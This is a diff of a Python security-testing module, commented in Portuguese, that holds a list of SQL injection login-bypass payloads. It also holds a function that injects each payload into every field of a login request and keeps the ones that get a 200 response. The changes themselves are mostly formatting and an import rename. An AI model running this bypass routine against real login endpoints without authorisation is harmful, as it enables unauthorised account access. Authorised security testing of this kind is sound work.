@@ -1,6 +1,6 @@
 import requests
-from playwright.sync_api import sync_playwright
-from .network_analisys import find_login_api_url
+
+from .network_analisis import find_login_api_url
 
 # Lista de payloads para tentar burlar a injeção SQL em campos de login
 bypass_sql_injection_list = [
@@ -17,8 +17,9 @@ bypass_sql_injection_list = [
     "' OR 'a'='a' /*",
     "' OR '1'='1' LIMIT 1; -- ",
     "' OR '1'='1' LIMIT 1; #",
-    "' OR '1'='1' LIMIT 1; /*"
+    "' OR '1'='1' LIMIT 1; /*",
 ]
+
 
 def login_test(url, json_login):
     """Realiza o POST de login e retorna o response."""
@@ -27,7 +28,8 @@ def login_test(url, json_login):
         return response
     except requests.exceptions.RequestException as e:
         print(f"An error occurred: {e}")
-        return 
+        return
+
 
 def sql_injection_test(payloads, login_url):
     """Testa cada payload na lista de injeção SQL e retorna os que funcionaram."""
@@ -42,9 +44,7 @@ def sql_injection_test(payloads, login_url):
     bypassed_payloads = []
 
     for key in informations["json_format"].keys():
-
         for payload in payloads:
-
             # Cria uma cópia do JSON original e insere o payload
             json_payload = informations["json_format"].copy()
             json_payload[key] = payload
@@ -54,8 +54,5 @@ def sql_injection_test(payloads, login_url):
             if response and response.status_code == 200:
                 response_json = response.json()
                 bypassed_payloads.append((key, payload, response_json))
-            
+
     return bypassed_payloads
-
-
-
